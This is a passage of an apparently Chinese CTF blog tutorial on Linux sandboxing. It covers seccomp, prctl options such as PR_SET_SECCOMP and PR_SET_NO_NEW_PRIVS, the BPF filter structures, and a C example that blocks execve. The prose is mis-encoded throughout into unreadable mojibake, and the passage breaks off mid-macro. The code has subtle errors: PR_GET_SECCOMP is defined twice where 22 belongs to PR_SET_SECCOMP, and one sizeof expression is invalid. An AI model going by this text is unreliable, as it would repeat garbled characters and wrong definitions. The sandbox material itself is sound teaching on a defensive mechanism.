    <content type="html"><![CDATA[<h1 id="åˆè¯†pwnæ²™ç®±"><a class="markdownIt-Anchor" href="#åˆè¯†pwnæ²™ç®±">#</a> åˆè¯† Pwn æ²™ç®±</h1><p>â€‹æ²™ç®±æœºåˆ¶ï¼Œè‹±æ–‡ sandboxï¼Œæ˜¯è®¡ç®—æœºé¢†åŸŸçš„è™šæ‹ŸæŠ€æœ¯ï¼Œå¸¸è§äºå®‰å…¨æ–¹å‘ã€‚ä¸€èˆ¬è¯´æ¥ï¼Œæˆ‘ä»¬ä¼šå°†ä¸å—ä¿¡ä»»çš„è½¯ä»¶æ”¾åœ¨æ²™ç®±ä¸­è¿è¡Œï¼Œä¸€æ—¦è¯¥è½¯ä»¶æœ‰æ¶æ„è¡Œä¸ºï¼Œåˆ™ç¦æ­¢è¯¥ç¨‹åºçš„è¿›ä¸€æ­¥è¿è¡Œï¼Œä¸ä¼šå¯¹çœŸå®ç³»ç»Ÿé€ æˆä»»ä½•å±å®³ã€‚</p><p>â€‹å®‰å…¨è®¡ç®—æ¨¡å¼ seccompï¼ˆSecure Computing Modeï¼‰åœ¨ Linux2.6.10 ä¹‹åå¼•å…¥åˆ° kernel çš„ç‰¹æ€§ï¼Œå¯ç”¨å…¶å®ç°ä¸€ä¸ªæ²™ç®±ç¯å¢ƒã€‚ä½¿ç”¨ seccomp æ¨¡å¼å¯ä»¥å®šä¹‰ç³»ç»Ÿè°ƒç”¨ç™½åå•å’Œé»‘åå•ã€‚seccomp æœºåˆ¶ç”¨äºé™åˆ¶åº”ç”¨ç¨‹åºå¯ä»¥ä½¿ç”¨çš„ç³»ç»Ÿè°ƒç”¨ï¼Œå¢åŠ ç³»ç»Ÿçš„å®‰å…¨æ€§ã€‚</p><p>â€‹åœ¨ ctf ä¸­ä¸»è¦é€šè¿‡ä¸¤ç§æ–¹å¼å®ç°æ²™ç®±æœºåˆ¶ï¼š</p><ul><li>prctl ç³»ç»Ÿè°ƒç”¨ï¼›</li><li>seccomp åº“å‡½æ•°ï¼›</li></ul><h2 id="1-prctlå‡½æ•°åˆæ¢"><a class="markdownIt-Anchor" href="#1-prctlå‡½æ•°åˆæ¢">#</a> 1ã€prctl å‡½æ•°åˆæ¢</h2><p>â€‹prctl æ˜¯åŸºæœ¬çš„è¿›ç¨‹ç®¡ç†å‡½æ•°ï¼Œæœ€åŸå§‹çš„æ²™ç®±è§„åˆ™å°±æ˜¯é€šè¿‡ prctl å‡½æ•°æ¥å®ç°çš„ï¼Œå®ƒå¯ä»¥å†³å®šæœ‰å“ªäº›ç³»ç»Ÿè°ƒç”¨å‡½æ•°å¯ä»¥è¢«è°ƒç”¨ï¼Œå“ªäº›ç³»ç»Ÿè°ƒç”¨å‡½æ•°ä¸èƒ½è¢«è°ƒç”¨ã€‚</p><p>â€‹ä¸‹é¢æ˜¯ /linux/prctl.h å’Œ seccomp ç›¸å…³çš„æºç ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Get/set process seccomp mode */</span></span><br><span class="line">    <span class="meta">#<span class="keyword">define</span> PR_GET_SECCOMP      21</span></span><br><span class="line">    <span class="meta">#<span class="keyword">define</span> PR_GET_SECCOMP     22</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * If no_new_privs is set, then operations that grant new privileges (i.e.</span></span><br><span class="line"><span class="comment"> * execve) will either fail or not grant them.  This affects suid/sgid,</span></span><br><span class="line"><span class="comment"> * file capabilities, and LSMs.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * Operations that merely manipulate or drop existing privileges (setresuid,</span></span><br><span class="line"><span class="comment"> * capset, etc.) will still work.  Drop those privileges if you want them gone.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * Changing LSM security domain is considered a new privilege.  So, for example,</span></span><br><span class="line"><span class="comment"> * asking selinux for a specific new context (e.g. with runcon) will result</span></span><br><span class="line"><span class="comment"> * in execve returning -EPERM.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * See Documentation/userspace-api/no_new_privs.rst for more details.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PR_SET_NO_NEW_PRIVS    38</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PR_GET_NO_NEW_PRIVS    39</span></span><br></pre></td></tr></table></figure><p>â€‹<strong>prctl å‡½æ•°åŸå‹</strong>ï¼šint prctl (int option,unsigned long argv2,unsigned long argv3,unsigned long argv4ï¼Œunsigned long argv3)</p><p>åœ¨å…·ä½“äº†è§£ prctl å‡½æ•°ä¹‹å‰ï¼Œæˆ‘ä»¬å†äº†è§£è¿™æ ·ä¸€ä¸ªæ¦‚å¿µï¼šæ²™ç®±ã€‚æ²™ç®± (Sandbox) æ˜¯ç¨‹åºè¿è¡Œè¿‡ç¨‹ä¸­çš„ä¸€ç§éš”ç¦»æœºåˆ¶ï¼Œå…¶ç›®çš„æ˜¯é™åˆ¶ä¸å¯ä¿¡è¿›ç¨‹å’Œä¸å¯ä¿¡ä»£ç çš„è®¿é—®æƒé™ã€‚seccomp æ˜¯å†…æ ¸ä¸­çš„ä¸€ç§å®‰å…¨æœºåˆ¶ï¼Œseccomp å¯ä»¥åœ¨ç¨‹åºä¸­ç¦ç”¨æ‰ä¸€äº›ç³»ç»Ÿè°ƒç”¨æ¥è¾¾åˆ°ä¿æŠ¤ç³»ç»Ÿå®‰å…¨çš„ç›®çš„ï¼Œseccomp è§„åˆ™çš„è®¾ç½®ï¼Œå¯ä»¥ä½¿ç”¨ prctl å‡½æ•°å’Œ seccomp å‡½æ•°æ—ã€‚</p><p>â€‹<strong>include/linux/prctl.h é‡Œé¢å­˜å‚¨ç€ prctl çš„æ‰€æœ‰å‚æ•°çš„å®å®šä¹‰ï¼Œprctl çš„äº”ä¸ªå‚æ•°ä¸­ï¼Œå…¶ä¸­ç¬¬ä¸€ä¸ªå‚æ•°æ˜¯ä½ è¦åšçš„äº‹æƒ…ï¼Œåé¢çš„å‚æ•°éƒ½æ˜¯å¯¹ç¬¬ä¸€ä¸ªå‚æ•°çš„é™å®šã€‚</strong></p><p>â€‹åœ¨ç¬¬ä¸€ä¸ªå‚æ•°ä¸­ï¼Œæˆ‘ä»¬éœ€è¦é‡ç‚¹å…³æ³¨çš„å‚æ•°æœ‰è¿™ä¸¤ä¸ªï¼š</p><ol><li>PR_SET_SECCOMP (22)ï¼šå½“ç¬¬ä¸€ä¸ªå‚æ•°æ˜¯ PR_SET_SECCOMP, ç¬¬äºŒä¸ªå‚æ•° argv2 ä¸º 1 çš„æ—¶å€™ï¼Œè¡¨ç¤ºå…è®¸çš„ç³»ç»Ÿè°ƒç”¨æœ‰ readï¼Œwriteï¼Œexit å’Œ sigereturnï¼›å½“ argv ç­‰äº 2 çš„æ—¶å€™ï¼Œè¡¨ç¤ºå…è®¸çš„ç³»ç»Ÿè°ƒç”¨ç”± argv3 æŒ‡å‘ sock_fprog ç»“æ„ä½“å®šä¹‰ï¼Œè¯¥ç»“æ„ä½“æˆå‘˜æŒ‡å‘çš„ sock_filter å¯ä»¥å®šä¹‰è¿‡æ»¤ä»»æ„ç³»ç»Ÿè°ƒç”¨å’Œç³»ç»Ÿè°ƒç”¨å‚æ•°ã€‚(ç»†èŠ‚è§ä¸‹å›¾)</li><li>PR_SET_NO_NEWPRIVS (38):prctl (38,1,0,0,0) è¡¨ç¤ºç¦ç”¨ç³»ç»Ÿè°ƒç”¨ execve () å‡½æ•°ï¼ŒåŒæ—¶ï¼Œè¿™ä¸ªé€‰é¡¹å¯ä»¥é€šè¿‡ fork () å‡½æ•°å’Œ clone () å‡½æ•°ç»§æ‰¿ç»™å­è¿›ç¨‹ã€‚</li></ol><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">sock_fprog</span> &#123;</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">short</span>        len;    <span class="comment">/* æŒ‡ä»¤ä¸ªæ•° */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">sock_filter</span> *<span class="title">filter</span>;</span> <span class="comment">/*æŒ‡å‘åŒ…å«struct sock_filterçš„ç»“æ„ä½“æ•°ç»„æŒ‡é’ˆ*/</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">sock_filter</span> &#123;</span>            <span class="comment">/* Filter block */</span></span><br><span class="line">    __u16 code;                 <span class="comment">/* Actual filter code,bpfæŒ‡ä»¤ç  */</span></span><br><span class="line">    __u8  jt;                   <span class="comment">/* Jump true */</span></span><br><span class="line">    __u8  jf;                   <span class="comment">/* Jump false */</span></span><br><span class="line">    __u32 k;                    <span class="comment">/* Generic multiuse field */</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="comment">//seccomp-dataç»“æ„ä½“è®°å½•å½“å‰æ­£åœ¨è¿›è¡Œbpfè§„åˆ™æ£€æŸ¥çš„ç³»ç»Ÿè°ƒç”¨ä¿¡æ¯</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">seccomp_data</span>&#123;</span></span><br><span class="line">    <span class="type">int</span> nr;<span class="comment">//ç³»ç»Ÿè°ƒç”¨å·</span></span><br><span class="line">    __u32 arch;<span class="comment">//è°ƒç”¨æ¶æ„</span></span><br><span class="line">    __u64 instruction_pointer;<span class="comment">//CPUæŒ‡ä»¤æŒ‡é’ˆ</span></span><br><span class="line">    __u64 argv[<span class="number">6</span>];<span class="comment">//å¯„å­˜å™¨çš„å€¼ï¼Œx86ä¸‹æ˜¯ebxï¼Œexc,edx,edi,ebp;x64ä¸‹æ˜¯rdi,rsi,rdx,r10,r8,r9</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="2-prctlå‡½æ•°è¯¦è§£"><a class="markdownIt-Anchor" href="#2-prctlå‡½æ•°è¯¦è§£">#</a> 2ã€prctl () å‡½æ•°è¯¦è§£</h2><p>â€‹ <code>prctl</code>  æ˜¯ä¸€ä¸ªç³»ç»Ÿè°ƒç”¨ï¼Œç”¨äºæ§åˆ¶å’Œä¿®æ”¹è¿›ç¨‹çš„è¡Œä¸ºå’Œå±æ€§ã€‚å®ƒå¯ä»¥åœ¨ Linux ç³»ç»Ÿä¸Šä½¿ç”¨ï¼Œæä¾›äº†å„ç§åŠŸèƒ½å’Œé€‰é¡¹æ¥ç®¡ç†è¿›ç¨‹çš„ä¸åŒæ–¹é¢ã€‚</p><p>â€‹ä»¥ä¸‹æ˜¯ <code>prctl</code>  å‡½æ•°çš„åŸºæœ¬åŸå‹ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/prctl.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">prctl</span><span class="params">(<span class="type">int</span> option, <span class="type">unsigned</span> <span class="type">long</span> arg2, <span class="type">unsigned</span> <span class="type">long</span> arg3, <span class="type">unsigned</span> <span class="type">long</span> arg4, <span class="type">unsigned</span> <span class="type">long</span> arg5)</span>;</span><br></pre></td></tr></table></figure><blockquote><p>â€‹prctl å‡½æ•°æ¥å—ä¸åŒçš„ option é€‰é¡¹å’Œå‚æ•°ï¼Œç”¨äºæ‰§è¡Œä¸åŒçš„æ“ä½œã€‚ä¸‹é¢æ˜¯ä¸€äº›å¸¸ç”¨çš„ option é€‰é¡¹åŠå…¶åŠŸèƒ½ï¼š</p><ul><li>PR_SET_NAMEï¼šè®¾ç½®è¿›ç¨‹åç§°ã€‚</li><li>PR_GET_NAMEï¼šè·å–è¿›ç¨‹åç§°ã€‚</li><li>PR_SET_PDEATHSIGï¼šè®¾ç½®åœ¨çˆ¶è¿›ç¨‹ç»ˆæ­¢æ—¶å‘é€ç»™å½“å‰è¿›ç¨‹çš„ä¿¡å·ã€‚</li><li>PR_GET_PDEATHSIGï¼šè·å–çˆ¶è¿›ç¨‹ç»ˆæ­¢æ—¶å‘é€ç»™å½“å‰è¿›ç¨‹çš„ä¿¡å·ã€‚</li><li>PR_SET_DUMPABLEï¼šè®¾ç½®è¿›ç¨‹çš„å¯è½¬å‚¨æ ‡å¿—ï¼Œå½±å“æ ¸å¿ƒè½¬å‚¨ã€‚</li><li>PR_GET_DUMPABLEï¼šè·å–è¿›ç¨‹çš„å¯è½¬å‚¨æ ‡å¿—ã€‚</li><li>PR_SET_SECCOMPï¼šè®¾ç½®è¿›ç¨‹çš„å®‰å…¨è®¡ç®—æ¨¡å¼ã€‚</li><li>PR_GET_SECCOMPï¼šè·å–è¿›ç¨‹çš„å®‰å…¨è®¡ç®—æ¨¡å¼ã€‚</li></ul></blockquote><p>â€‹è¿™äº›ä»…æ˜¯ä¸€äº›å¸¸ç”¨çš„é€‰é¡¹ï¼Œ <code>prctl</code>  è¿˜æ”¯æŒå…¶ä»–é€‰é¡¹å’ŒåŠŸèƒ½ã€‚æ¯ä¸ªé€‰é¡¹éƒ½æœ‰ç‰¹å®šçš„å‚æ•°ï¼Œå¯ä»¥æ ¹æ®éœ€è¦ä¼ é€’ã€‚å…·ä½“çš„å‚æ•°å’Œè¡Œä¸ºå–å†³äºæ‰€é€‰çš„é€‰é¡¹ã€‚</p><p>â€‹ä»¥ä¸‹æ˜¯ä¸€ä¸ªç®€å•çš„ç¤ºä¾‹ï¼Œå±•ç¤ºäº†å¦‚ä½•ä½¿ç”¨ <code>prctl</code>  å‡½æ•°è®¾ç½®è¿›ç¨‹åç§°ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> _GNU_SOURCE</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/prctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">const</span> <span class="type">char</span>* process_name = <span class="string">&quot;MyProcess&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (prctl(PR_SET_NAME, (<span class="type">unsigned</span> <span class="type">long</span>) process_name) == <span class="number">-1</span>) &#123;</span><br><span class="line">        perror(<span class="string">&quot;prctl&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// è·å–è¿›ç¨‹åç§°</span></span><br><span class="line">    <span class="type">char</span> name[<span class="number">16</span>];</span><br><span class="line">    <span class="keyword">if</span> (prctl(PR_GET_NAME, (<span class="type">unsigned</span> <span class="type">long</span>) name) == <span class="number">-1</span>) &#123;</span><br><span class="line">        perror(<span class="string">&quot;prctl&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Process name: %s\n&quot;</span>, name);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>â€‹åœ¨ä¸Šè¿°ç¤ºä¾‹ä¸­ï¼Œæˆ‘ä»¬ä½¿ç”¨ prctl å‡½æ•°å°†å½“å‰è¿›ç¨‹çš„åç§°è®¾ç½®ä¸º &quot;MyProcess&quot;ã€‚ç„¶åï¼Œæˆ‘ä»¬å†æ¬¡ä½¿ç”¨ prctl å‡½æ•°è·å–è¿›ç¨‹çš„åç§°ï¼Œå¹¶å°†å…¶æ‰“å°åˆ°æ ‡å‡†è¾“å‡ºã€‚</p><p>â€‹è¯·æ³¨æ„ï¼Œprctl å‡½æ•°çš„å…·ä½“è¡Œä¸ºå’Œå¯ç”¨é€‰é¡¹å¯èƒ½å› æ“ä½œç³»ç»Ÿå’Œç‰ˆæœ¬è€Œå¼‚ã€‚åœ¨ä½¿ç”¨ prctl å‡½æ•°æ—¶ï¼Œåº”è¯¥æŸ¥é˜…ç›¸å…³æ–‡æ¡£å¹¶äº†è§£æ‰€ä½¿ç”¨çš„æ“ä½œç³»ç»Ÿçš„æ”¯æŒå’Œé™åˆ¶ã€‚</p><h2 id="3-bpfè¿‡æ»¤è§„åˆ™ä¼¯å…‹åˆ©å°è£…åŒ…è¿‡æ»¤"><a class="markdownIt-Anchor" href="#3-bpfè¿‡æ»¤è§„åˆ™ä¼¯å…‹åˆ©å°è£…åŒ…è¿‡æ»¤">#</a> 3ã€BPF è¿‡æ»¤è§„åˆ™ (ä¼¯å…‹åˆ©å°è£…åŒ…è¿‡æ»¤)</h2><p>â€‹çªç ´æ²™ç®±è§„åˆ™ï¼Œæœ¬è´¨ä¸Šå°±æ˜¯ä¸€ç§è¶Šæƒæ¼æ´ã€‚seccomp æ˜¯ linux ä¿æŠ¤è¿›ç¨‹å®‰å…¨çš„ä¸€ç§ä¿æŠ¤æœºåˆ¶ï¼Œå®ƒé€šè¿‡å¯¹ç³»ç»Ÿè°ƒç”¨å‡½æ•°çš„é™åˆ¶ï¼Œæ¥ä¿æŠ¤å†…æ ¸æ€çš„å®‰å…¨ã€‚æ‰€è°“æ²™ç®±ï¼Œå°±æ˜¯æŠŠç”¨æˆ·æ€å’Œå†…æ ¸æ€ç›¸äº’åˆ†ç¦»å¼€ï¼Œè®©ç”¨æˆ·æ€çš„è¿›ç¨‹ï¼Œä¸è¦å½±å“åˆ°å†…æ ¸æ€ï¼Œä»è€Œä¿è¯ç³»ç»Ÿå®‰å…¨ã€‚</p><p>â€‹å¦‚æœæˆ‘ä»¬åœ¨æ²™ç®±ä¸­ï¼Œå®Œå…¨éµå®ˆ seccomp æœºåˆ¶ï¼Œæˆ‘ä»¬ä¾¿åªèƒ½è°ƒç”¨ exit (),sigreturn (),read () å’Œ write () è¿™å››ç§ç³»ç»Ÿè°ƒç”¨ï¼Œé‚£ä¹ˆå…¶å®æˆ‘ä»¬çš„è¿›ç¨‹åº”è¯¥æ˜¯å®‰å…¨çš„ï¼ˆå…¶å®ä¹Ÿä¸ä¸€å®šï¼Œåé¢çš„ä¾‹é¢˜å°±æ²¡æœ‰æº¢å‡ºï¼Œè€Œæ˜¯é€šè¿‡ç³»ç»Ÿè°ƒç”¨ç›´æ¥è¯»å–æ–‡ä»¶ï¼‰ã€‚ä½†æ˜¯ï¼Œç”±äºä»–çš„è§„åˆ™è¿‡äºæ­»æ¿ï¼Œæ‰€ä»¥åé¢å‡ºç°äº†è¿‡æ»¤æ¨¡å¼ï¼Œè®©æˆ‘ä»¬å¯ä»¥è°ƒç”¨åˆ°é‚£äº›ç³»ç»Ÿè°ƒç”¨ã€‚å›é¡¾ä¸Šé¢æåˆ°çš„ PT_SET_SECCOMP è¿™ä¸ªå‚æ•°ï¼Œåé¢æ¥åˆ°çš„ç¬¬ä¸€ä¸ªå‚æ•°ï¼Œå°±æ˜¯å®ƒè®¾ç½®çš„æ¨¡å¼ï¼Œç¬¬ä¸‰ä¸ªå‚æ•°ï¼ŒæŒ‡å‘ sock_fprog ç»“æ„ä½“ï¼Œsock_fprog ç»“æ„ä½“ä¸­ï¼Œåˆæœ‰æŒ‡å‘ sock_filter ç»“æ„ä½“çš„æŒ‡é’ˆï¼Œsock_filter ç»“æ„ä½“è¿™é‡Œï¼Œå°±æ˜¯æˆ‘ä»¬è¦è®¾ç½®è§„åˆ™çš„åœ°æ–¹ã€‚</p><p>æˆ‘ä»¬åœ¨è®¾ç½®è¿‡æ»¤è§„åˆ™ï¼Œåœ¨é¢å¯¹æ²™ç®±é¢˜ç›®çš„æ—¶å€™ï¼Œä¼šç»å¸¸ç”¨åˆ° Seccomp-tools è¿™ä¸ªå·¥å…·ã€‚</p><p><strong>BPF æŒ‡ä»¤é›†ç®€ä»‹</strong></p><blockquote><p>BPF_LDï¼šåŠ è½½æ“ä½œï¼ŒBPF_H è¡¨ç¤ºæŒ‰ç…§å­—èŠ‚ä¼ é€ï¼ŒBPF_W è¡¨ç¤ºæŒ‰ç…§åŒå­—æ¥ä¼ é€ï¼ŒBPF_B è¡¨ç¤ºä¼ é€å•ä¸ªå­—èŠ‚ã€‚</p><p>BPF_LDXï¼šä»å†…å­˜ä¸­åŠ è½½ byte/half-word/word/double-wordã€‚</p><p>BPF_ST,BPF_STXï¼šå­˜å‚¨æ“ä½œ</p><p>BPF_ALU,BPT_ALU64ï¼šé€»è¾‘æ“ä½œè¿ç®—ã€‚</p><p>BPT_JMPï¼šè·³è½¬æ“ä½œï¼Œå¯ä»¥å’Œ JGEï¼ŒJGTï¼ŒJEQï¼ŒJSET ä¸€èµ·è¡¨ç¤ºæœ‰æ¡ä»¶çš„è·³è½¬ï¼Œå’Œ BPF_JA ä¸€èµ·è¡¨ç¤ºæ²¡æœ‰æ¡ä»¶çš„è·³è½¬ã€‚</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stddef.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;linux/seccomp.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;linux/filter.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;sys/prctl.h&gt;</span>    </span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;linux/bpf.h&gt;</span>             <span class="comment">//offå’Œimméƒ½æ˜¯æœ‰ç¬¦å·ç±»å‹ï¼Œç¼–ç ä¿¡æ¯å®šä¹‰åœ¨å†…æ ¸å¤´æ–‡ä»¶linux/bpf.h</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">sock_filter</span> <span class="title">filter</span>[]=</span>&#123;</span><br><span class="line">                BPF_STMT(BPF_LD|BPF_W|BPF_ABS, <span class="number">0</span>),   <span class="comment">// ä»ç¬¬0ä¸ªå­—èŠ‚å¼€å§‹ï¼Œä¼ é€4ä¸ªå­—èŠ‚</span></span><br><span class="line">                BPF_JUMP(BPF_JMP|BPF_JEQ, <span class="number">59</span>, <span class="number">1</span>, <span class="number">0</span>), <span class="comment">// æ¯”è¾ƒæ˜¯å¦ä¸º59ï¼ˆexecve çš„ç³»ç»Ÿè°ƒç”¨å·ï¼‰ï¼Œæ˜¯å°±è·³è¿‡ä¸‹ä¸€è¡Œï¼Œå¦‚æœä¸æ˜¯ï¼Œå°±æ‰§è¡Œä¸‹ä¸€è¡Œï¼Œç¬¬ä¸‰ä¸ªå‚æ•°è¡¨ç¤ºæ‰§è¡Œæ­£ç¡®çš„æŒ‡ä»¤è·³è½¬ï¼Œç¬¬å››ä¸ªå‚æ•°è¡¨ç¤ºæ‰§è¡Œé”™è¯¯çš„æŒ‡ä»¤è·³è½¬</span></span><br><span class="line">                BPF_JUMP(BPF_JMP|BPF_JGE, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>),</span><br><span class="line">        <span class="comment">//      BPF_STMP(BPF_RET+BPF_K,SECCOMP_RET_KILL),</span></span><br><span class="line">        <span class="comment">//        æ€æ­»ä¸€ä¸ªè¿›ç¨‹</span></span><br><span class="line">        <span class="comment">//        BPF_STMP(BPF_RET+BPF_K,SECCOMP_RET_TRACE),</span></span><br><span class="line">        <span class="comment">//        çˆ¶è¿›ç¨‹è¿½è¸ªå­è¿›ç¨‹ï¼Œå…·ä½“æ²¡å¤ªææ¸…æ¥š</span></span><br><span class="line">                 BPF_STMT(BPF_RET+BPF_K,SECCOMP_RET_ERRNO),</span><br><span class="line">        <span class="comment">//        å¼‚å¸¸å¤„ç†</span></span><br><span class="line">                BPF_STMT(BPF_RET+BPF_K,SECCOMP_RET_ALLOW),</span><br><span class="line">        <span class="comment">//        è¿™é‡Œè¡¨ç¤ºç³»ç»Ÿè°ƒç”¨å¦‚æœæ­£å¸¸ï¼Œå…è®¸ç³»ç»Ÿè°ƒç”¨</span></span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">sock_fprog</span> <span class="title">prog</span>=</span>&#123;</span><br><span class="line">                .len=<span class="keyword">sizeof</span>(filter)/<span class="keyword">sizeof</span>(sock_filter[<span class="number">0</span>]),</span><br><span class="line">                .filter=filter,</span><br><span class="line">        &#125;;</span><br><span class="line">        prctl(PR_SET_NO_NEW_PRIVS,<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>);</span><br><span class="line">        prctl(PR_SET_SECCOMP,SECCOMP_MODE_FILTER,&amp;prog);<span class="comment">//ç¬¬ä¸€ä¸ªå‚æ•°æ˜¯è¿›è¡Œä»€ä¹ˆè®¾ç½®ï¼Œç¬¬äºŒä¸ªå‚æ•°æ˜¯è®¾ç½®çš„è¿‡æ»¤æ¨¡å¼ï¼Œç¬¬ä¸‰ä¸ªå‚æ•°æ˜¯è®¾ç½®çš„è¿‡æ»¤è§„åˆ™</span></span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;123&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>â€‹å¼€å§‹çš„æ—¶å€™ï¼Œæˆ‘ä»¬è®¾ç½®äº† sock_filter ç»“æ„ä½“æ•°ç»„ã€‚è¿™é‡Œä¸ºä»€ä¹ˆæ˜¯ä¸€ä¸ªç»“æ„ä½“æ•°ç»„å‘¢ï¼Ÿå› ä¸ºæˆ‘ä»¬çœ‹åˆ°é‡Œé¢æœ‰ BPF_STMT å’Œ BPF_JMP çš„å®å®šä¹‰ï¼Œå…¶å® BPF_STMT å’Œ BPF_JMP éƒ½æ˜¯æ¡ä»¶ç¼–è¯‘åèµ‹å€¼çš„ sock_filter ç»“æ„ä½“ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">ifndef</span>     BPF_STMT</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span>    BPF_STMT(code,k)&#123;(unsigned short)(code),0,0,k&#125;</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">ifndef</span>     BPF_JUMP</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span>    BPF_JUMP(code,k,jt,jf)&#123;(unsigned short)(code),jt,jf,k&#125;</span></span><br><span class="line"><span class="meta">#<span 